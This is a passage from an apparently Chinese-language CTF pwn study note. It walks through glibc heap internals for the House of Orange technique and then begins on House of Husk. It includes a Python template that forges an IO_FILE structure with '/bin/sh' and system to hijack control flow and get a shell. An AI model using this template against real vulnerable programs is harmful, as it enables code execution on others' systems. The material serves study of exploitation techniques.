</span></span><span class=line><span class=cl><span class=n>old_size</span> <span class=o>=</span> <span class=nf>chunksize</span><span class=p>(</span><span class=n>old_top</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>old_end</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)(</span><span class=nf>chunk_at_offset</span><span class=p>(</span><span class=n>old_top</span><span class=p>,</span> <span class=n>old_size</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=nf>assert</span><span class=p>((</span><span class=n>old_top</span> <span class=o>==</span> <span class=nf>initial_top</span><span class=p>(</span><span class=n>av</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=n>old_size</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=o>||</span>
</span></span><span class=line><span class=cl>     <span class=p>((</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=p>)(</span><span class=n>old_size</span><span class=p>)</span> <span class=o>&gt;=</span> <span class=n>MINSIZE</span> <span class=o>&amp;&amp;</span>
</span></span><span class=line><span class=cl>      <span class=nf>prev_inuse</span><span class=p>(</span><span class=n>old_top</span><span class=p>)</span> <span class=o>&amp;&amp;</span>
</span></span><span class=line><span class=cl>      <span class=p>((</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=p>)</span><span class=n>old_end</span> <span class=o>&amp;</span> <span class=p>(</span><span class=n>pagesize</span> <span class=o>-</span> <span class=mi>1</span><span class=p>))</span> <span class=o>==</span> <span class=mi>0</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nf>assert</span><span class=p>((</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=p>)(</span><span class=n>old_size</span><span class=p>)</span> <span class=o>&lt;</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=p>)(</span><span class=n>nb</span> <span class=o>+</span> <span class=n>MINSIZE</span><span class=p>));</span></span></span></code></pre></div></div><ul><li>判断是否连续，理论上是连续的，于是调用系统调用 brk 扩展，brk 指向上一个 top chunk 结束位置</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>size</span> <span class=o>=</span> <span class=n>nb</span> <span class=o>+</span> <span class=n>mp_</span><span class=p>.</span><span class=n>top_pad</span> <span class=o>+</span> <span class=n>MINSIZE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nf>contiguous</span><span class=p>(</span><span class=n>av</span><span class=p>))</span> <span class=c1>// 若top chunk 连续
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>size</span> <span class=o>-=</span> <span class=n>old_size</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>size</span> <span class=o>=</span> <span class=nf>ALIGN_UP</span><span class=p>(</span><span class=n>size</span><span class=p>,</span> <span class=n>pagesize</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>size</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>){</span>
</span></span><span class=line><span class=cl>  <span class=n>brk</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)(</span><span class=nf>MORECORE</span><span class=p>(</span><span class=n>size</span><span class=p>));</span> <span class=c1>// 通过brk来扩展
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=nf>LIBC_PROBE</span><span class=p>(</span><span class=n>memory_sbrk_more</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=n>brk</span><span class=p>,</span> <span class=n>size</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>brk</span> <span class=o>!=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)(</span><span class=n>MORECORE_FAILURE</span><span class=p>)){</span> <span class=c1>// brk调用成功，将top chunk 扩展了size大小
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>hook</span><span class=p>)(</span><span class=kt>void</span><span class=p>)</span> <span class=o>=</span> <span class=nf>atomic_forced_read</span><span class=p>(</span><span class=n>__after_morecore_hook</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nf>__builtin_expect</span><span class=p>(</span><span class=n>hook</span> <span class=o>!=</span> <span class=nb>NULL</span><span class=p>,</span> <span class=mi>0</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=p>(</span><span class=o>*</span><span class=n>hook</span><span class=p>)();</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></div></div><img src=/img/pwn_note.zh-cn.assets/image-20250111200846661.png alt=图片无法加载><ul><li>由于改小了 size，此时如上图<code>brk &lt; old_end</code>跳过第一个判断和第二个判断</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>brk</span> <span class=o>!=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)(</span><span class=n>MORECORE_FAILURE</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>mp_</span><span class=p>.</span><span class=n>sbrk_base</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>mp_</span><span class=p>.</span><span class=n>sbrk_base</span> <span class=o>=</span> <span class=n>brk</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>av</span><span class=o>-&gt;</span><span class=n>system_mem</span> <span class=o>+=</span> <span class=n>size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>brk</span> <span class=o>==</span> <span class=n>old_end</span> <span class=o>&amp;&amp;</span> <span class=n>snd_brk</span> <span class=o>==</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)(</span><span class=n>MORECORE_FAILURE</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=nf>set_head</span><span class=p>(</span><span class=n>old_top</span><span class=p>,</span> <span class=p>(</span><span class=n>size</span> <span class=o>+</span> <span class=n>old_size</span><span class=p>)</span> <span class=o>|</span> <span class=n>PREV_INUSE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>else</span> <span class=nf>if</span> <span class=p>(</span><span class=nf>contiguous</span><span class=p>(</span><span class=n>av</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=n>old_size</span> <span class=o>&amp;&amp;</span> <span class=n>brk</span> <span class=o>&lt;</span> <span class=n>old_end</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=nf>malloc_printerr</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=s>&#34;break adjusted to free malloc space&#34;</span><span class=p>,</span> <span class=n>brk</span><span class=p>,</span> <span class=n>av</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span></span></span></code></pre></div></div><ul><li>由于 brk 新申请的 chunk 与原 top chunk 不连续，进行后续操作，ptmalloc 认为堆段不连续，会通过 brk 继续扩展堆区域</li><li>而释放原先 top chunk 进入 unsorted bin 中，并在新的 top chunk 中切一块内存返回，且新增 2 个 0x10 大小的 chunk</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>snd_brk</span> <span class=o>!=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)(</span><span class=n>MORECORE_FAILURE</span><span class=p>))</span> <span class=c1>// 表示申请成功
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>{</span> <span class=c1>// 需要对不连续的原先top chunk进行处理
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>av</span><span class=o>-&gt;</span><span class=n>top</span> <span class=o>=</span> <span class=p>(</span><span class=n>mchunkptr</span><span class=p>)</span><span class=n>aligned_brk</span><span class=p>;</span> <span class=c1>// 上一个不连续的top chunk
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=nf>set_head</span><span class=p>(</span><span class=n>av</span><span class=o>-&gt;</span><span class=n>top</span><span class=p>,</span> <span class=p>(</span><span class=n>snd_brk</span> <span class=o>-</span> <span class=n>aligned_brk</span> <span class=o>+</span> <span class=n>correction</span><span class=p>)</span> <span class=o>|</span> <span class=n>PREV_INUSE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>av</span><span class=o>-&gt;</span><span class=n>system_mem</span> <span class=o>+=</span> <span class=n>correction</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>old_size</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>old_size</span> <span class=o>=</span> <span class=p>(</span><span class=n>old_size</span> <span class=o>-</span> <span class=mi>4</span> <span class=o>*</span> <span class=n>SIZE_SZ</span><span class=p>)</span> <span class=o>&amp;</span> <span class=o>~</span><span class=n>MALLOC_ALIGN_MASK</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>set_head</span><span class=p>(</span><span class=n>old_top</span><span class=p>,</span> <span class=n>old_size</span> <span class=o>|</span> <span class=n>PREV_INUSE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 设置标记防止后续需要后续堆块prev_size情况的错误
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>chunk_at_offset</span><span class=p>(</span><span class=n>old_top</span><span class=p>,</span> <span class=n>old_size</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>size</span> <span class=o>=</span> <span class=p>(</span><span class=mi>2</span> <span class=o>*</span> <span class=n>SIZE_SZ</span><span class=p>)</span> <span class=o>|</span> <span class=n>PREV_INUSE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>chunk_at_offset</span><span class=p>(</span><span class=n>old_top</span><span class=p>,</span> <span class=n>old_size</span> <span class=o>+</span> <span class=mi>2</span> <span class=o>*</span> <span class=n>SIZE_SZ</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>size</span> <span class=o>=</span> <span class=p>(</span><span class=mi>2</span> <span class=o>*</span> <span class=n>SIZE_SZ</span><span class=p>)</span> <span class=o>|</span> <span class=n>PREV_INUSE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>old_size</span> <span class=o>&gt;=</span> <span class=n>MINSIZE</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nf>_int_free</span><span class=p>(</span><span class=n>av</span><span class=p>,</span> <span class=n>old_top</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span> <span class=c1>// 释放掉之前的 top chunk
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span></span></span></code></pre></div></div><p><strong>利用</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=n>p64</span><span class=p>(</span><span class=mh>0xfb1</span><span class=p>))</span> <span class=c1># 修改 top chunk 大小</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0xff0</span><span class=p>)</span> <span class=c1># 触发将top chunk 释放到 unsorted bin中</span></span></span></code></pre></div></div><h5 id=step-2>Step 2</h5><ul><li>修改 unsorted bin chunk 的 size 为 <strong>0x61</strong> ，且 bk 字段指向 <code>_IO_list_all - 0x10</code>，同时在 chunk 中伪造 <code>IO_FILE</code>结构体</li></ul><img src=/img/pwn_note.zh-cn.assets/image-20250111214201279.png alt=图片无法加载><ul><li>申请一个大小不等于 0x60 的 chunk，首先循环在 unsorted bin 寻找，由于 bk 被修改，不满足<code>bck == unsorted_chunks(av)</code>，不会从该 chunk 切下合适 chunk 返回</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>while</span> <span class=p>((</span><span class=n>victim</span> <span class=o>=</span> <span class=nf>unsorted_chunks</span><span class=p>(</span><span class=n>av</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>bk</span><span class=p>)</span> <span class=o>!=</span> <span class=nf>unsorted_chunks</span><span class=p>(</span><span class=n>av</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>bck</span> <span class=o>=</span> <span class=n>victim</span><span class=o>-&gt;</span><span class=n>bk</span><span class=p>;</span> <span class=c1>// victim的前一个chunk
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=p>...;</span>
</span></span><span class=line><span class=cl>  <span class=n>size</span> <span class=o>=</span> <span class=nf>chunksize</span><span class=p>(</span><span class=n>victim</span><span class=p>);</span> <span class=c1>// 获取chunk大小
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=c1>// 需要切割情况
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=k>if</span> <span class=p>(</span><span class=nf>in_smallbin_range</span><span class=p>(</span><span class=n>nb</span><span class=p>)</span> <span class=o>&amp;&amp;</span>	<span class=c1>// 申请大小在small bin范围
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=n>bck</span> <span class=o>==</span> <span class=nf>unsorted_chunks</span><span class=p>(</span><span class=n>av</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=c1>// unsorted bin中只有一个chunk victim
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=n>victim</span> <span class=o>==</span> <span class=n>av</span><span class=o>-&gt;</span><span class=n>last_remainder</span> <span class=o>&amp;&amp;</span> <span class=c1>// victim刚好是last_remainder
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=p>)(</span><span class=n>size</span><span class=p>)</span> <span class=o>&gt;</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=p>)(</span><span class=n>nb</span> <span class=o>+</span> <span class=n>MINSIZE</span><span class=p>))</span> <span class=c1>// victim大小 &gt; 申请大小 + 0x20
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=p>{</span></span></span></code></pre></div></div><ul><li>将该 chunk 从 unsorted bin 中取出，完成 unsorted bin attack 将 fd 中的<code>_IO_list_all</code>指针值改为<code>unsorted_chunks(av)</code></li><li>并将其放入 small bin 中，接着进入 unsorted bin 第二次循环，此时 victim 为 <code>_IO_list_all - 0x10</code>，因此不会通过对<code>victim->size</code>检查，进入<code>malloc_printferr</code>函数</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>while</span> <span class=p>((</span><span class=n>victim</span> <span class=o>=</span> <span class=nf>unsorted_chunks</span><span class=p>(</span><span class=n>av</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>bk</span><span class=p>)</span> <span class=o>!=</span> <span class=nf>unsorted_chunks</span><span class=p>(</span><span class=n>av</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>bck</span> <span class=o>=</span> <span class=n>victim</span><span class=o>-&gt;</span><span class=n>bk</span><span class=p>;</span> <span class=c1>// victim的前一个chunk
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=k>if</span> <span class=p>(</span><span class=nf>__builtin_expect</span><span class=p>(</span><span class=n>victim</span><span class=o>-&gt;</span><span class=n>size</span> <span class=o>&lt;=</span> <span class=mi>2</span> <span class=o>*</span> <span class=n>SIZE_SZ</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span> <span class=o>||</span>
</span></span><span class=line><span class=cl>      <span class=nf>__builtin_expect</span><span class=p>(</span><span class=n>victim</span><span class=o>-&gt;</span><span class=n>size</span> <span class=o>&gt;</span> <span class=n>av</span><span class=o>-&gt;</span><span class=n>system_mem</span><span class=p>,</span> <span class=mi>0</span><span class=p>))</span>
</span></span><span class=line><span class=cl>      <span class=c1>// 若小于0x10或大于arena管理的最大内存，报错
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>malloc_printerr</span><span class=p>(</span><span class=n>check_action</span><span class=p>,</span> <span class=s>&#34;malloc(): memory corruption&#34;</span><span class=p>,</span> <span class=nf>chunk2mem</span><span class=p>(</span><span class=n>victim</span><span class=p>),</span> <span class=n>av</span><span class=p>);</span></span></span></code></pre></div></div><ul><li><p>遍历<code>_IO_list_all</code>对应 <code>IO_FILE</code>链表，若满足条件会调用 vtable 中<code>_IO_overflow</code>函数，获得 shell</p></li><li><p><strong>调用链</strong>：<code>malloc_printerr -> __libc_message -> abort -> fflush -> _IO_flush_all_lockp</code></p></li></ul><p><strong>概率</strong></p><p>有概率会出现第一个<code>_IO_FILE_plus</code>直接调用 vtable 导致出错，需要遍历到第二个<code>_IO_FILE_plus</code>调用 vtable 才会成功</p><p><strong>模板</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;/bin/sh</span><span class=se>\x00</span><span class=s2>&#34;</span>  <span class=c1># _flags, an magic number</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x61</span><span class=p>)</span>  <span class=c1># _IO_read_ptr</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _IO_read_end</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;_IO_list_all&#39;</span><span class=p>]</span> <span class=o>-</span> <span class=mh>0x10</span><span class=p>)</span>  <span class=c1># _IO_read_base</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _IO_write_base</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>])</span>  <span class=c1># _IO_write_ptr</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _IO_write_end</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _IO_buf_base;</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _IO_buf_end should usually be (_IO_buf_base + 1)</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span>  <span class=c1># from _IO_save_base to _markers</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># the FILE chain ptr</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>  <span class=c1># _fileno for stderr is 2</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _flags2, usually 0</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xFFFFFFFFFFFFFFFF</span><span class=p>)</span>  <span class=c1># _old_offset, -1</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p16</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _cur_column</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span>  <span class=c1># _vtable_offset</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span>  <span class=c1># _shortbuf[1]</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># padding</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _IO_stdfile_1_lock</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xFFFFFFFFFFFFFFFF</span><span class=p>)</span>  <span class=c1># _offset, -1</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _codecvt, usually 0</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _IO_wide_data_1</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>*</span> <span class=mi>3</span>  <span class=c1># from _freeres_list to __pad5</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0xFFFFFFFF</span><span class=p>)</span>  <span class=c1># _mode, usually -1</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span> <span class=o>*</span> <span class=mi>19</span>  <span class=c1># _unused2</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>=</span> <span class=n>fake_file</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0xD8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>  <span class=c1># adjust to vtable</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap_base</span> <span class=o>+</span> <span class=mh>0x40</span> <span class=o>+</span> <span class=mh>0x10</span><span class=p>)</span>  <span class=c1># fake vtable</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>edit_chunk</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x10</span> <span class=o>+</span> <span class=n>fake_file</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add_chunk</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=mh>0x500</span><span class=p>)</span> <span class=c1># 触发报错</span></span></span></code></pre></div></div><p>glibc-2.27 开始，abort 函数改动，不再调用 <code>_IO_flush_all_lockp</code> 函数，因此不能利用 malloc_printerr 实现程序执行流劫持</p><h4 id=house-of-husk>House of Husk</h4><ul><li>利用<code>printf</code>自定义格式化字符串相关函数</li><li>glibc 中通过<code>__register_printf_function</code>为<code>printf</code>格式化字符串中的<code>spec</code>(%d 中的 d)注册对应函数</li><li>维护字符与函数映射关系只通过<code>__printf_function_table</code>和<code>__printf_arginfo_table</code>2 指针访问</li></ul><p><strong>其中，两个表均为 glibc 中全局变量，各自都包含 0x100 项且相邻，每一个项 0x8 字节，类似哈希表，spec 对应值偏移处放入函数或参数指针</strong></p><p><strong>printf</strong></p><p>两种调用：<code>__parse_one_specmb</code>中的调用及<code>printf_positional</code>中的调用</p><ol><li><p><code>printf</code>调用 <code>__printf</code>，接着调用<code>__vfprintf_internal</code>，其中先调用<code>buffered_vfprintf</code></p></li><li><p>返回<code>__vfprintf_internal</code>调用<code>printf_positional</code></p></li><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>function_done</span> <span class=o>=</span> <span class=n>__printf_function_table</span><span class=p>[(</span><span class=kt>size_t</span><span class=p>)</span> <span class=n>spec</span><span class=p>]</span><span class=c1>// 调用function_table中函数
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>specs</span><span class=p>[</span><span class=n>nspecs_done</span><span class=p>].</span><span class=n>info</span><span class=p>,</span> <span class=n>ptr</span><span class=p>);</span></span></span></code></pre></div></div></li><li><p>以及在<code>printf_positional</code>中调用<code>__parse_one_specmb</code></p></li><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nf>__builtin_expect</span> <span class=p>(</span><span class=n>__printf_function_table</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span> <span class=c1>// 覆盖后不满足
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=o>||</span> <span class=n>spec</span><span class=o>-&gt;</span><span class=n>info</span><span class=p>.</span><span class=n>spec</span> <span class=o>&gt;</span> <span class=n>UCHAR_MAX</span> <span class=c1>// 不满足
